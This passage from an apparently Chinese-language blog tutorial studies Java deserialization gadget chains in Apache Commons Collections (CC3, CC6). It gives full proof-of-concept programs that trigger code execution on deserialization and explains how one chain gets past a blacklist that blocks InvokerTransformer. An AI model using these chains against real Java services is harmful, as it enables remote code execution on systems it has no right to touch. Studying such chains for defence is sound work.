&#125;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>结合一下啊：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706042.png"></p><h4 id="CC6："><a href="#CC6：" class="headerlink" title="CC6："></a>CC6：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(lazyMap,chainedTransformer);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(outerMap, chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706864.png"></p><h3 id="CC3-（InstantiateTransformer）"><a href="#CC3-（InstantiateTransformer）" class="headerlink" title="CC3 （InstantiateTransformer）"></a>CC3 （<font style="color:rgb(26, 32, 44);">InstantiateTransformer</font>）</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707898.png"></p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>而在 ysoserial 中并没有使用 <strong><font style="color:rgb(44, 62, 80);">InvokerTransformer</font></strong><font style="color:rgb(44, 62, 80);">，这是因为黑名单过滤时很有可能会将 </font><strong><font style="color:rgb(44, 62, 80);">InvokerTransformer </font></strong><font style="color:rgb(44, 62, 80);">直接禁用，为了更广泛的使用， ysoserial 换了一条路：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707295.png"></p><blockquote><p>《Java 安全漫谈》中也有提及</p><p>2015年初，@frohoff和@gebl发布了Talk<a href="https://frohoff.github.io/appseccali-marshalling-pickles/">《Marshalling Pickles: how deserializing objects will ruin your day》</a>，以及Java反序列化利用工具ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似 <a href="https://github.com/ikkisoft/SerialKiller">Serialkiller</a> 这样的工具随之诞生。</p><p>SerialKiller是一个ava反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf">黑名单</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716289.png"></p><p>这个黑名单中InvokerTransformer赫然在列，也就切断了CommonsCollections1的利用链。有攻就有防，ysoserial随后增加了不少新的Gadgets，其中就包括CommonsCollections3。</p><p>CommonsCollections3的目的很明显，就是为了绕过一些规则对InvokerTransformer的限制。CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAxFilter</code>。</p></blockquote><p>现在继续找 <font style="color:#080808;background-color:#ffffff;">newTransformer 的用法：</font></p><p>这里的 <code>Process</code> 只是 <code>exec()</code> 的返回值，如果你不去读它的输出或等待它结束，它就没用了，一般对象，不用它</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707624.png"></p><p><code>getOutProperties</code><font style="color:rgb(80, 80, 92);">，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707947.png"></p><p><font style="color:rgb(80, 80, 92);">TransformerFactoryImpl 不能序列化，并且构造函数传参困难</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708644.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708046.png"></p><p><font style="color:#080808;background-color:#ffffff;">TrAXFilter 也不能序列化，但构造函数简单，想着调用 TrAXFilter 的构造函数</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708403.png"></p><p>那么如何使用 <font style="color:#080808;background-color:#ffffff;">TrAXFilter 的构造函数，这里用到了 </font><font style="color:rgb(26, 32, 44);">InstantiateTransformer</font></p><p><font style="color:rgb(26, 32, 44);">InstantiateTransformer.</font><font style="color:#080808;background-color:#ffffff;">transform  判断传入的参数是否为 Class 类型，如果是，获取指定构造器，调用构造函数。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708848.png"></p><h4 id="构造POC："><a href="#构造POC：" class="headerlink" title="构造POC："></a>构造POC：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> 